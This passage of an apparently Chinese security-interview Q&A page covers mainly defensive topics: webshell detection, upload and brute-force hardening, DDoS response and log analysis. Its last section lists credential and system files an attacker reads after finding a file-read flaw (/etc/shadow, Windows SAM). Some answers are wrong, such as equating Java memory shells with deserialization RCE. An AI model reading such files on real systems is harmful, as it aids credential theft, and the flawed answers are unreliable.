注入加固措施，针对不同的应用和场景，可能需要采用不同的加固措施。在进行 SQL 注入防御时，需要综合考虑多种因素，并不断更新和完善自身的防御措施，以提高安全水平并减少被攻击的风险。</p><hr><h2 id="文件上传和命令执行，有看过相关日志吗？"><a href="#文件上传和命令执行，有看过相关日志吗？" class="headerlink" title="文件上传和命令执行，有看过相关日志吗？"></a>文件上传和命令执行，有看过相关日志吗？</h2><p>文件上传和命令执行都是常见的 Web 应用程序安全漏洞，攻击者利用漏洞上传恶意文件或执行恶意代码，从而获取服务器上的敏感数据或控制服务器。在进行安全管理时，通常可以通过查看相关日志来发现潜在的安全威胁。</p><p>对于文件上传漏洞，以下是一些可能存在的相关日志：</p><ol><li><p>文件上传日志：Web 服务器或应用服务器上的访问日志中可能包含上传文件的信息，例如上传时间、上传文件名称、上传文件大小等。</p></li><li><p>访问控制日志：如果应用程序实现了文件上传的访问控制机制，记录访问控制的日志可能包含了上传文件的信息，例如上传人员、上传时间、上传 IP 地址等。</p></li><li><p>安全审计日志：如果使用了安全审计工具，可以记录文件上传操作的详细信息，例如上传文件的路径、上传文件的内容等。</p></li></ol><p>对于命令执行漏洞，以下是一些可能存在的相关日志：</p><ol><li><p>访问日志：Web 服务器或应用服务器上的访问日志中可能包含恶意代码执行的信息，例如请求 URL、HTTP 请求方法、HTTP 状态码等。</p></li><li><p>异常日志：应用程序中的异常日志可以记录可能存在的恶意代码执行异常信息，例如异常类型、异常堆栈等。</p></li><li><p>安全审计日志：如果使用了安全审计工具，可以记录恶意代码执行的详细信息，例如恶意代码的来源、执行时间、执行结果等。</p></li></ol><p>需要注意的是，以上只是其中一部分可能存在的相关日志，实际应用中还有更多可能的日志类型。在进行文件上传和命令执行漏洞的检测和防御时，需要根据具体应用进行评估和选择，并及时发现和修复潜在的安全威胁。</p><hr><h2 id="你能说明文件上传的原理吗？"><a href="#你能说明文件上传的原理吗？" class="headerlink" title="你能说明文件上传的原理吗？"></a>你能说明文件上传的原理吗？</h2><p>当用户上传文件时，通常需要通过 HTTP 或 HTTPS 协议将文件传输到 Web 服务器。文件上传的原理可以简单地描述为：</p><ol><li><p>客户端向服务器发送一个包含文件数据的 POST 请求。</p></li><li><p>服务器接收请求并解析其中的文件数据。</p></li><li><p>服务器将文件保存在指定的目录下，并返回处理结果给客户端。</p></li></ol><p>具体来说，文件上传流程一般如下：</p><ol><li><p>用户在 Web 页面上选择要上传的文件，并提交表单。</p></li><li><p>浏览器将表单中的数据进行编码并作为 POST 请求发送给 Web 服务器。</p></li><li><p>Web 服务器接收到请求后，会解析请求参数，获取上传的文件数据。</p></li><li><p>服务器对上传的文件进行校验和过滤，例如检查文件格式、大小、类型等，防止上传恶意文件。</p></li><li><p>如果上传的文件符合要求，则将文件存储在指定的位置，如果不符合要求，则拒绝上传并返回错误信息。</p></li><li><p>服务器返回上传结果给客户端，告知用户文件是否上传成功。</p></li></ol><p>需要注意的是，文件上传涉及到的安全问题较多，例如上传的文件可能会包含病毒、木马等恶意程序，攻击者可能会利用上传漏洞上传恶意文件，从而导致服务器被控制。因此，在进行文件上传功能开发时，需要仔细考虑安全问题，并采取相应的防御措施，例如限制上传文件大小、过滤不安全的文件类型等。</p><hr><h2 id="文件上传攻击特征？"><a href="#文件上传攻击特征？" class="headerlink" title="文件上传攻击特征？"></a>文件上传攻击特征？</h2><p>文件上传攻击是指攻击者通过网站上的文件上传功能，上传恶意文件来执行攻击。以下是一些文件上传攻击的特征：</p><ol><li><p>文件类型绕过：攻击者可能会尝试上传不受支持的文件类型，或者将文件类型伪装成其他类型，以绕过文件类型检查。</p></li><li><p>文件名欺骗：攻击者可能会使用诱人的文件名称来欺骗用户下载或打开恶意文件。</p></li><li><p>文件内容：上传的文件可能包含恶意代码、木马、病毒等恶意程序，这些程序可被用于攻击和控制目标系统。</p></li><li><p>大小限制绕过：攻击者可能会尝试绕过文件大小的限制，上传超过规定大小的文件。</p></li><li><p>目录遍历：攻击者可能会通过在文件名中插入..&#x2F;等字符来遍历目标服务器上的目录，获取敏感信息或执行攻击。</p></li></ol><p>如果您担心自己的网站可能会受到文件上传攻击，请确保实施足够的安全措施，如限制上传文件类型、大小和数量、对上传的文件进行检查、将上传的文件保存在安全的位置，并为所有上传的文件生成一个唯一的文件名。</p><h2 id="文件上传加固方法？"><a href="#文件上传加固方法？" class="headerlink" title="文件上传加固方法？"></a>文件上传加固方法？</h2><p>以下是保护您的网站免受文件上传攻击的一些方法：</p><ol><li><p>文件类型和大小限制：在服务器端对上传的文件进行检查，确保上传的文件类型、大小和数量符合预期。可以使用白名单方式进行限制，只允许上传特定类型的文件。</p></li><li><p>检查文件内容：在服务器端对上传的文件进行检查，确保它们不包含恶意代码或病毒等危险内容。可以使用杀毒软件或安全扫描工具来帮助检查上传的文件。</p></li><li><p>重命名文件：将上传的文件保存在一个新的随机生成的文件名下，而不是使用用户提供的文件名。这样可以避免攻击者通过伪造文件名来欺骗用户。</p></li><li><p>存储位置：将上传的文件保存在与网站主目录分离的位置上，以避免攻击者上传Webshell等恶意脚本，并能够防止攻击者直接访问上传的文件。</p></li><li><p>使用安全上传类库：使用安全的上传类库或框架，如Apache Commons FileUpload、SecureFileUploader等。</p></li><li><p>HTTPS加密：在传输过程中使用HTTPS协议加密，以避免数据在传输过程中被窃听或篡改。</p></li><li><p>日志审计：记录所有的文件上传操作并定期审计日志，以便发现异常上传行为，及时采取措施。</p></li></ol><p>总之，防止文件上传攻击需要综合考虑多种因素，包括文件类型、大小、内容、存储位置、传输方式等，同时定期进行安全审计，并且对于应用程序代码的编写需要充分考虑安全因素。</p><h2 id="暴力破解加固方法？"><a href="#暴力破解加固方法？" class="headerlink" title="暴力破解加固方法？"></a>暴力破解加固方法？</h2><p>以下是一些保护您的网站免受暴力破解攻击的方法：</p><ol><li><p>密码策略：实施强密码策略，建议用户使用包含大写字母、小写字母、数字和特殊字符等不同类型字符组成的复杂密码，并设置密码长度要求。</p></li><li><p>账户锁定：限制密码尝试次数，并在多次失败后自动锁定账户。同时，应该通过邮件或短信通知用户他们的账户已被锁定，以防止攻击者对其进行进一步攻击。</p></li><li><p>人机验证：在登录页面引入验证码或其他形式的人机验证，以防止自动化破解程序的攻击。</p></li><li><p>访问控制：实施访问控制策略，限制只有授权用户才能够访问敏感信息或功能。而且还应该限制来自未知来源或具有恶意行为的IP地址的访问。</p></li><li><p>强制退出：如果用户长时间没有活动，应强制退出登录状态，以防止攻击者通过利用未注销的会话进行攻击。</p></li><li><p>检测异常行为：检测异常登录行为，如从异常地区或设备登录，或频繁更改登录IP地址等。</p></li><li><p>安全日志审计：监控并记录登录事件，并对日志进行审计和分析，以便及时发现异常行为并采取措施。</p></li></ol><p>总之，在防止暴力破解攻击方面，需要综合考虑多种因素，包括密码策略、账户锁定、人机验证、访问控制、强制退出、检测异常行为等。同时，应保持应用程序的更新，及时修补安全漏洞，以确保系统的完整性和安全性。</p><h2 id="DDOS-CC等攻击应急思路以及如何防范"><a href="#DDOS-CC等攻击应急思路以及如何防范" class="headerlink" title="DDOS CC等攻击应急思路以及如何防范"></a>DDOS CC等攻击应急思路以及如何防范</h2><p>DDoS（分布式拒绝服务攻击）和 CC（HTTP）攻击是目前比较普遍的网络攻击方式之一。以下是应急响应思路以及如何防范这些攻击的建议：</p><ol><li>应急响应思路</li></ol><p>在受到DDoS和CC攻击时，应采取以下措施来降低攻击对系统的影响：</p><ul><li>快速检测并确认攻击类型和攻击源；</li><li>提高带宽和资源利用率，以提供更强的承载能力；</li><li>实施流量清洗、流量限制和IP封堵等措施，清除恶意攻击流量；</li><li>配合 ISP 进行攻击源 IP 的追踪和协助；</li><li>在攻击持续期间，保持实时监控和跟进，随时更新应急响应策略。</li></ul><ol><li>如何防范</li></ol><p>为了预防DDoS和CC攻击，可以采取以下方法：</p><ul><li>增加网络带宽，并提高硬件设备的承载能力，以抵御较小规模的攻击；</li><li>实现DDoS和CC攻击的检测和防御机制，如基于流量和行为的检测技术和防御技术；</li><li>确保服务器和网站软件及时更新，以弥补已知漏洞；</li><li>实施流量清洗、流量限制和IP封堵等措施；</li><li>配置合理的防火墙规则和入侵检测系统（IDS）等安全设备；</li><li>加强网络安全教育，提高用户密码安全性，并定期对敏感数据进行备份和加密。</li></ul><p>总之，在防范DDoS和CC攻击方面，需要综合考虑多种因素，包括增加带宽、提高硬件承载能力、实现攻击检测和防御机制、确保服务器和网站软件及时更新、加强网络安全教育等。同时，应该建立完善的应急响应机制和紧急处理预案，以做好应急响应准备和快速响应。</p><h2 id="挖矿病毒判断以及处理方式"><a href="#挖矿病毒判断以及处理方式" class="headerlink" title="挖矿病毒判断以及处理方式"></a>挖矿病毒判断以及处理方式</h2><p>挖矿病毒是指利用受感染的计算机进行加密货币挖矿的恶意软件。以下是判断和处理挖矿病毒的一些方法：</p><ol><li>判断挖矿病毒</li></ol><p>通过以下迹象可以判断计算机是否被感染了挖矿病毒：</p><ul><li>计算机运行速度变慢，CPU占用率高；</li><li>电脑风扇声音变大，温度升高；</li><li>安全软件报告未知病毒或恶意软件；</li><li>系统出现闪退或死机等异常情况。</li></ul><ol><li>处理方式</li></ol><p>如果怀疑计算机已经被感染了挖矿病毒，可以采取以下措施：</p><ul><li>及时更新杀毒软件，并开启实时保护模式；</li><li>扫描整个系统，清除所有恶意文件和注册表项；</li><li>禁止不明程序自启动，及时关闭被感染的进程；</li><li>在安装软件时仔细阅读许可协议，禁止安装未知来源的软件；</li><li>加强账户权限管理，限制非管理员用户对系统的操作权限；</li><li>及时备份重要文件，以便在恶意软件攻击后恢复数据。</li></ul><p>总之，在处理挖矿病毒方面，需要及时发现和清除感染，并加强系统的安全防护措施，如升级杀毒软件、限制非管理员用户权限、备份重要文件等。同时，也需要加强网络安全教育，提高用户对于计算机安全的意识和防范能力。</p><h2 id="服务器存在-webshell，如何处理？"><a href="#服务器存在-webshell，如何处理？" class="headerlink" title="服务器存在 webshell，如何处理？"></a>服务器存在 webshell，如何处理？</h2><p>Webshell是一种Web服务器上的恶意代码，可以使攻击者远程控制服务器，并执行各种命令、上传下载文件等操作。以下是处理服务器存在Webshell的一些方法：</p><ol><li>扫描和确认Webshell</li></ol><p>可以通过查看Web服务器日志或使用安全扫描工具来确认是否存在Webshell。找出所有可疑文件并进行彻底检查，以确定是否存在Webshell。</p><ol><li>删除Webshell</li></ol><p>如果确定存在Webshell，需要立即将其删除，并对系统进行全面清理。删除Webshell时，应同时清除与Webshell相关的文件和目录，并且应用程序代码也需要进行更新和修复。</p><ol><li>加强安全防护措施</li></ol><p>为了避免服务器再次被感染，需要加强安全防护措施，包括加强服务器的监控和日志审计、安装杀毒软件并定期更新、限制非管理员用户权限等。</p><ol><li>修改密码</li></ol><p>修改服务器管理员的账户密码，并确保强密码策略得到实施，建议使用包含大写字母、小写字母、数字和特殊字符等不同类型字符组成的复杂密码，并设置密码长度要求。</p><ol><li>更新和修复应用程序代码</li></ol><p>Webshell通常是由于应用程序存在漏洞或安全问题而被植入的。因此，为了防止类似问题再次发生，需要及时更新并修复应用程序代码中的安全漏洞。</p><p>总之，在处理服务器存在Webshell的问题时，需要快速准确地识别和清除Webshell，并加强服务器和应用程序的安全防护措施。同时，也需要定期进行巡检和审计，及时发现和排除漏洞，以确保系统的完整性和安全性。</p><h2 id="排查-shell-应该用什么命令来进行排查？"><a href="#排查-shell-应该用什么命令来进行排查？" class="headerlink" title="排查 shell 应该用什么命令来进行排查？"></a>排查 shell 应该用什么命令来进行排查？</h2><p>要排查 shell 的问题，可以使用以下命令：</p><ol><li><p><code>echo</code>：用于打印变量或字符串，可以用来检查变量的值是否正确。</p></li><li><p><code>set</code>：用于显示所有的 shell 变量和函数，包括环境变量。</p></li><li><p><code>env</code>：用于显示当前 shell 环境下的所有环境变量。</p></li><li><p><code>source</code> 或 <code>.</code>：用于读取并执行指定文件中的命令，通常用于重新加载配置文件。</p></li><li><p><code>sh -x script.sh</code>：用于以调试模式执行脚本，并输出每个执行的命令及其参数。</p></li><li><p><code>ps</code>：用于列出当前正在运行的进程，可以使用 <code>ps aux</code> 查看详细信息。</p></li><li><p><code>top</code>：用于实时查看系统资源的使用情况，可以用来定位占用 CPU 或内存过高的进程。</p></li><li><p><code>grep</code>：用于搜索指定的文本内容，可以用来查找特定日志文件中的错误信息等。</p></li></ol><p>这些命令可以帮助您快速诊断 shell 中的问题。</p><h2 id="如何检测-webshell？"><a href="#如何检测-webshell？" class="headerlink" title="如何检测 webshell？"></a>如何检测 webshell？</h2><p>Webshell是指嵌入到Web服务器上的一种命令执行环境，可以通过Web页面或HTTP协议与其进行交互，攻击者可以利用Webshell来执行各种恶意操作。检测Webshell可以使用以下几种方法：</p><ol><li><p>查看Web服务器访问日志：Webshell通常会产生异常的网络流量，例如向非标准端口发送POST请求等。查看Web服务器的访问日志，观察是否存在异常的请求。</p></li><li><p>安全扫描工具：使用安全扫描工具对Web服务器进行扫描，以检测是否存在Webshell。常用的安全扫描工具包括Nessus、OpenVAS等。</p></li><li><p>文件监控：Webshell通常会将恶意代码写入某个文件中，因此可以通过文件监控工具来检测Webshell。例如，当文件被修改时，文件监控工具会立即发送警报。</p></li><li><p>内存监控：有些高级的Webshell可能不会在磁盘上留下任何痕迹，而是直接将代码注入到内存中。因此，可以使用内存监控工具来检测是否存在Webshell。</p></li><li><p>安全审计：对Web服务器进行安全审计，检查是否存在安全漏洞，例如文件上传漏洞、命令注入漏洞等。攻击者通常会利用这些漏洞来上传Webshell。</p></li></ol><p>以上方法并不能完全保证检测到所有的Webshell，因此建议在Web服务器上部署安全防护解决方案，定期进行安全扫描和审核，并及时更新软件补丁。</p><h2 id="一台主机在内网进行横向攻击，你应该怎么做？"><a href="#一台主机在内网进行横向攻击，你应该怎么做？" class="headerlink" title="一台主机在内网进行横向攻击，你应该怎么做？"></a>一台主机在内网进行横向攻击，你应该怎么做？</h2><p>如果一台主机在内网进行横向攻击，建议采取以下措施：</p><ol><li><p>隔离受感染的主机：立即将受感染的主机隔离，防止攻击者继续向其他主机传播恶意软件。</p></li><li><p>停止该主机的网络访问：为了避免感染蔓延到其他网络节点，需要立即停止该主机的网络访问。</p></li><li><p>收集攻击信息：记录并收集有关攻击者、攻击方式和攻击原因的信息。这些信息有助于后续的调查和取证工作。</p></li><li><p>清除恶意软件：使用杀毒软件或恶意软件清理工具对受感染的主机进行扫描和清理，确保所有恶意文件都被删除。</p></li><li><p>升级系统补丁：检查受感染主机是否存在已知漏洞，并及时安装相应的系统补丁，以防止攻击者再次利用已知漏洞进行攻  击。</p></li><li><p>取证和分析：对受感染的主机进行取证和分析，以确定攻击者的入侵路径和方法，为后续的防御和修复工作提供参考。</p></li><li><p>加强安全防护：加强内网安全防护，定期进行内网安全扫描和审核，及时发现并修复安全漏洞。</p></li></ol><p>总之，在一台主机在内网进行横向攻击时，需要尽快采取以上措施，避免恶意软件感染蔓延到其他网络节点，最大程度保护整个内网的安全。</p><h2 id="常见端口及其漏洞有哪些？"><a href="#常见端口及其漏洞有哪些？" class="headerlink" title="常见端口及其漏洞有哪些？"></a>常见端口及其漏洞有哪些？</h2><p>以下是常见的端口及其漏洞：</p><ol><li><p>端口 21（FTP）：FTP服务常用于文件传输，常见漏洞包括弱口令、任意文件上传漏洞等。</p></li><li><p>端口 22（SSH）：SSH是远程登录系统的协议，常见漏洞包括弱口令、暴力破解、身份验证绕过等。</p></li><li><p>端口 23（Telnet）：Telnet是一个远程控制协议，常见漏洞包括明文传输敏感信息、会话劫持等。</p></li><li><p>端口 25（SMTP）：SMTP是发送电子邮件的标准协议，常见漏洞包括垃圾邮件滥用、反射攻击等。</p></li><li><p>端口 53（DNS）：DNS是域名解析服务，常见漏洞包括DNS缓存投毒、DDoS攻击等。</p></li><li><p>端口 80&#x2F;443（HTTP&#x2F;HTTPS）：HTTP&#x2F;HTTPS是Web服务器常用的协议，常见漏洞包括SQL注入、XSS跨站脚本攻击、文件上传漏洞等。</p></li><li><p>端口 135（RPC）：RPC是远程过程调用协议，常见漏洞包括缓冲区溢出、拒绝服务攻击等。</p></li><li><p>端口 139&#x2F;445（SMB）：SMB是Windows系统的文件共享协议，常见漏洞包括远程代码执行、密码破解等。</p></li><li><p>端口 3389（RDP）：RDP是Windows远程桌面协议，常见漏洞包括弱口令、暴力破解、远程代码执行等。</p></li></ol><p>以上仅是一些常见的端口及其漏洞，实际上还有很多其他的端口和漏洞。为了减少被攻击的风险，建议定期进行安全扫描，及时修复已知漏洞，并加强网络安全防护。</p><h2 id="你能大概说一下，比如数据包或者日志，你的分析思路是什么，以及你会用到哪些工具或者那些网站进行查询？"><a href="#你能大概说一下，比如数据包或者日志，你的分析思路是什么，以及你会用到哪些工具或者那些网站进行查询？" class="headerlink" title="你能大概说一下，比如数据包或者日志，你的分析思路是什么，以及你会用到哪些工具或者那些网站进行查询？"></a>你能大概说一下，比如数据包或者日志，你的分析思路是什么，以及你会用到哪些工具或者那些网站进行查询？</h2><p>当我分析数据包或者日志时，通常会采用如下的思路：</p><ol><li><p>收集数据包或日志文件：首先需要收集相关的数据包或日志文件，以便后续分析。</p></li><li><p>过滤和提取关键信息：对于大量的数据包或日志，需要通过过滤和提取关键信息的方式来缩小分析范围。例如，可以使用Wireshark的过滤器或grep命令来筛选出特定协议、IP地址等关键信息。</p></li><li><p>分析数据包或日志：根据需求进行数据包或日志的分析，并尝试从中发现异常或可疑行为。例如，可以查找异常的流量模式、不寻常的端口、频率异常的请求等。</p></li><li><p>确认问题并记录结论：在分析过程中，需要确认是否存在安全问题，并记录所得到的结论。</p></li><li><p>对问题进行修复和防范：最后，需要针对分析结果采取相应的措施，例如修补漏洞、加强访问控制、优化安全策略等，以降低风险和增强安全性。</p></li></ol><p>在这个过程中，我可能会使用以下一些工具和网站：</p><ul><li>Wireshark：网络数据包分析工具，用于捕获和分析网络数据包。</li><li>ELK Stack：用于日志管理和分析的综合解决方案，包括Elasticsearch、Logstash和Kibana。</li><li>grep命令：用于在文本文件中搜索特定模式的字符串。</li><li>WHOIS查询工具：用于查询域名的注册信息。</li><li>端口扫描工具：例如nmap，用于识别目标主机上开放的端口和服务。</li><li>CVE漏洞数据库：用于查询已知漏洞的详细信息。</li><li>OWASP Top 10：一个常见的Web应用程序安全风险排名列表，用于参考Web应用程序是否存在常见的安全问题。</li></ul><p>需要注意的是，分析过程中所用到的工具和网站因情况而异，具体根据实际需求进行选择。</p><h2 id="给你一个比较大的日志，应该如何分析"><a href="#给你一个比较大的日志，应该如何分析" class="headerlink" title="给你一个比较大的日志，应该如何分析"></a>给你一个比较大的日志，应该如何分析</h2><p>当面对一个比较大的日志文件时，通常需要采用以下几个步骤进行分析：</p><ol><li><p>对日志文件进行预处理：如果日志文件比较大，首先可以考虑对其进行切割、筛选等操作。例如，可以使用Linux系统中的split命令将大型日志文件拆成多个小文件，以便于后续的处理。</p></li><li><p>确定日志格式：在分析日志之前，需要了解日志的格式，例如时间戳、事件类型、IP地址等信息。这有助于我们快速定位和分析日志中的内容。</p></li><li><p>使用工具进行分析：目前市面上有很多针对日志分析的软件工具，例如ELK Stack（Elasticsearch、Logstash、Kibana）、Splunk等。这些工具能够帮助我们更加高效地分析、搜索和可视化日志数据。</p></li><li><p>定义分析目标：在开始分析日志之前，需要明确所需得到的结果以及要回答的问题。例如，我们可能需要查找某个特定的事件或行为、识别与安全相关的异常或潜在威胁等。</p></li><li><p>进行分析并记录结论：根据分析目标，采用相应的方法和工具对日志文件进行分析，并记录分析结论。同时要把发现的异常或有用的信息进行整理和汇总。</p></li><li><p>采取相应措施：根据分析结果，确定需要采取的措施。例如，修复漏洞、更新安全策略、加强访问控制等。</p></li></ol><p>需要注意的是，在处理大型日志文件时，可能会消耗较多的时间和计算资源。因此，可以通过合理地利用计算机硬件（例如使用多核CPU和高速磁盘）来提高处理效率。同时也可以将任务分解成多个小部分进行并行处理，以进一步提升分析效率。</p><h2 id="如何查看系统内存-shell"><a href="#如何查看系统内存-shell" class="headerlink" title="如何查看系统内存 shell"></a>如何查看系统内存 shell</h2><p>我们可以通过使用一些命令来查看系统内存的使用情况。以下是一些常用的命令：</p><ol><li>free：用于显示当前系统的内存使用情况，包括已用内存、空闲内存、缓冲区内存和交换分区内存等。</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">$ free -h</span><br><span class="line">              total        used        free      shared  buff/cache   available</span><br><span class="line">Mem:           7.8G        3.4G        289M         88M        4.1G        4.0G</span><br><span class="line">Swap:          2.0G        895M        1.1G</span><br></pre></td></tr></table></figure><ol><li><p>top：用于实时监视进程的运行状态，包括CPU和内存的使用情况。在 top 命令中，我们可以按 M 键排序以查看占用内存较多的进程。</p></li><li><p>ps：用于列出正在运行的进程，可以结合其他的选项来查看进程的详细信息，例如：</p></li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">$ ps aux --sort=-%mem | head</span><br><span class="line">USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND</span><br><span class="line">root         1  0.0  0.1 225804 11356 ?        Ss   05:30   0:01 /sbin/init splash</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>以上命令都是在命令行环境下执行的。如果要图形化地查看系统内存使用情况，可以使用 GNOME 系统监视器（gnome-system-monitor）或 KDE 系统监视器（ksysguard）等工具，在图形化界面中方便地查看系统内存的使用情况和进程信息。</p><p>需要注意的是，当我们在 shell 中查看内存使用情况时，不要随意终止或杀死系统进程，否则可能会导致不可预估的后果。</p><h2 id="不安全的第三方组件的漏洞如何做前置规避？"><a href="#不安全的第三方组件的漏洞如何做前置规避？" class="headerlink" title="不安全的第三方组件的漏洞如何做前置规避？"></a>不安全的第三方组件的漏洞如何做前置规避？</h2><p>以下是一些规避不安全的第三方组件漏洞的前置方法：</p><ol><li><p>筛选可靠的第三方组件：在选择和采用第三方组件时，应该尽量选择那些经过广泛使用和审查、开源社区活跃、有明确维护计划等因素使人们信任的组件。此外还可以参考其他用户反馈、评测结果等对第三方组件进行评估。</p></li><li><p>定期更新组件版本：及时更新第三方组件以修复已知漏洞是很重要的。因此，需要定期检查并更新使用的第三方组件。</p></li><li><p>加强访问控制：为了防止黑客攻击通过不安全的第三方组件进入系统，需要加强访问控制，例如限制只有授权用户才能访问系统。</p></li><li><p>实施安全策略：实施相关的安全策略，如深度防御、安全审计等，以提高系统的安全性。</p></li><li><p>停用不必要的功能：如果某个第三方组件包含多个功能，但仅有部分功能被系统所用到，建议将未使用的功能关闭或移除，从而减少系统被攻击的风险。</p></li><li><p>使用漏洞扫描工具进行检测：使用漏洞扫描工具对系统中的第三方组件进行定期检测，及时发现已知漏洞并修复。</p></li></ol><p>需要注意的是，在前置规避不安全的第三方组件漏洞时，不能完全依赖于单一的措施。相反，应该采用多种手段来提高系统的安全性，从而避免被攻击者利用不安全的第三方组件漏洞进行攻击。</p><h2 id="Java-内存马排查有了解吗"><a href="#Java-内存马排查有了解吗" class="headerlink" title="Java 内存马排查有了解吗"></a>Java 内存马排查有了解吗</h2><p>Java内存马，也称为Java远程代码执行漏洞，是一种利用Java反序列化漏洞的攻击方式。攻击者可以通过构造恶意的序列化对象，将其发送给目标服务器并触发反序列化操作，从而在目标服务器上执行任意代码。以下是几种排查Java内存马的方法：</p><ol><li><p>追踪日志文件：如果系统已经被攻击，应该首先检查系统的日志文件，查找异常的请求或响应内容，并结合其他的信息确定是否存在Java内存马。</p></li><li><p>检查网络流量：可以使用Wireshark等网络抓包工具来监视服务器的网络流量，并分析报文中的数据内容，查找是否存在异常的Java序列化数据。</p></li><li><p>检查反序列化漏洞：Java内存马利用了Java反序列化漏洞，因此我们可以使用一些反序列化漏洞扫描工具（如 ysoserial）来检测系统是否受到这类漏洞的影响，并及时修补漏洞。</p></li><li><p>检查系统进程：Java内存马通常会在目标服务器上启动一个新的进程来执行恶意代码，因此可以通过检查系统进程列表，查找是否存在不明确的、异常的进程。</p></li><li><p>安装安全软件：为了更好地保障系统的安全性，可以安装一些专业的安全软件，如杀毒软件、入侵检测系统（IDS）等，并定期进行扫描和审计。</p></li></ol><p>需要注意的是，在排查Java内存马时，应该综合使用多种方法来确定是否存在此类攻击。同时也要及时修补系统漏洞，加强访问控制，并采取其他措施提高系统的安全性。</p><h2 id="如何修改-WEB-端口？如果不能修改端口还有什么利用方法？"><a href="#如何修改-WEB-端口？如果不能修改端口还有什么利用方法？" class="headerlink" title="如何修改 WEB 端口？如果不能修改端口还有什么利用方法？"></a>如何修改 WEB 端口？如果不能修改端口还有什么利用方法？</h2><p>要修改 WEB 端口，需要在 Web 服务器的配置文件中修改端口号。以下是一些常见的 Web 服务器的端口修改方式：</p><ol><li>Apache：找到 Apache 的 httpd.conf 配置文件，编辑 Listen 指令即可。</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">Listen 8080</span><br></pre></td></tr></table></figure><ol start="2"><li>Nginx：找到 Nginx 的 nginx.conf 配置文件，编辑 http 模块下的 listen 指令即可。</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">http &#123;</span><br><span class="line">    ...</span><br><span class="line">    server &#123;</span><br><span class="line">        listen 8080;</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol start="3"><li>Tomcat：找到 Tomcat 的 server.xml 配置文件，编辑 Connector 指令中的 port 属性即可。</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;Connector port=&quot;8080&quot; protocol=&quot;HTTP/1.1&quot;</span><br><span class="line">           connectionTimeout=&quot;20000&quot;</span><br><span class="line">           redirectPort=&quot;8443&quot; /&gt;</span><br></pre></td></tr></table></figure><p>如果不能修改端口，攻击者可能会尝试其他利用方法，如：</p><ol><li><p>尝试使用默认或者弱口令登录：许多 web 应用程序都有默认的用户名和密码，或者用户使用简单的密码。攻击者可以通过爆破等方式，尝试使用这些凭据登录系统。</p></li><li><p>利用已知漏洞进行攻击：攻击者可以通过利用已知的漏洞来攻击目标系统，例如，注入攻击、文件上传漏洞、跨站点脚本（XSS）漏洞等。</p></li><li><p>利用社工攻击：攻击者可以使用钓鱼邮件、欺诈电话等方式进行社交工程攻击，从而获得目标系统的访问凭据或者其他重要信息。</p></li></ol><p>为了防止这些攻击，我们应该采取一系列措施来加强系统安全。例如：</p><ol><li><p>使用复杂的密码和多因素身份验证，提高登录安全性。</p></li><li><p>及时更新软件版本和安全补丁，修复已知的漏洞。</p></li><li><p>限制访问权限，仅允许授权用户访问系统，并对不明来源的流量进行阻拦或监测。</p></li><li><p>部署入侵检测系统（IDS）或入侵防御系统（IPS），对入侵行为进行实时监测和防范。</p></li><li><p>定期进行漏洞扫描、安全审计等工作，及时发现并修补系统中存在的漏洞。</p></li></ol><h2 id="获得文件读取漏洞，通常会读哪些文件，Linux-和-windows-都谈谈"><a href="#获得文件读取漏洞，通常会读哪些文件，Linux-和-windows-都谈谈" class="headerlink" title="获得文件读取漏洞，通常会读哪些文件，Linux 和 windows 都谈谈"></a>获得文件读取漏洞，通常会读哪些文件，Linux 和 windows 都谈谈</h2><p>获得文件读取漏洞后，攻击者通常会尝试读取一些敏感信息，例如系统配置文件、数据库凭据、应用程序源代码等。以下是在 Linux 和 Windows 操作系统上，攻击者可能会尝试读取的一些文件：</p><ol><li>Linux</li></ol><ul><li>&#x2F;etc&#x2F;passwd：包含本地用户的账户信息。</li><li>&#x2F;etc&#x2F;group：包含用户组的信息。</li><li>&#x2F;etc&#x2F;shadow：保存本地用户密码哈希值的文件。</li><li>&#x2F;etc&#x2F;sudoers：保存 sudo 命令权限的文件。</li><li>&#x2F;proc&#x2F;net&#x2F;tcp：包含当前正在运行的 TCP 连接信息。</li><li>&#x2F;var&#x2F;log&#x2F;auth.log：包含系统中用户认证和授权的日志信息。</li><li>应用程序配置文件：攻击者可能会尝试读取应用程序的配置文件，以获取数据库连接字符串等信息。</li></ul><ol><li>Windows</li></ol><ul><li>C:\Windows\system32\config\SAM：包含本地账户的哈希密码值。</li><li>C:\Windows\system32\config\SYSTEM：包含系统的配置信息。</li><li>C:\inetpub\wwwroot\web.config：包含 IIS 网站的配置信息。</li><li>C:\Program Files (x86)\MySQL\MySQL Server 5.7\my.ini：包含 MySQL 数据库的配置信息。</li><li>C:\ProgramData\Microsoft\Crypto\RSA\MachineKeys：包含机器级别的 RSA 密钥。</li><li>Event log 文件：攻击者可能会尝试读取操作系统事件日志文件，以查看系统的历史记录信息。</li><li>应用程序配置文件：攻击者可能会尝试读取应用程序的配置文件，以获取数据库连接字符串等信息。</li></ul><p>为了防止文件读取漏洞的攻击，我们可以采取以下一些措施：</p><ol><li><p>限制访问权限：在操作系统、应用程序和网站中，应该合理设置安全访问策略，并对敏感信息和文件进行严格的权限控制。</p></li><li><p>加密重要文件：对重要文件进行加密处理，防止黑客获取有效信息。</p></li><li><p>安装入侵检测系统（IDS）：使用 IDS 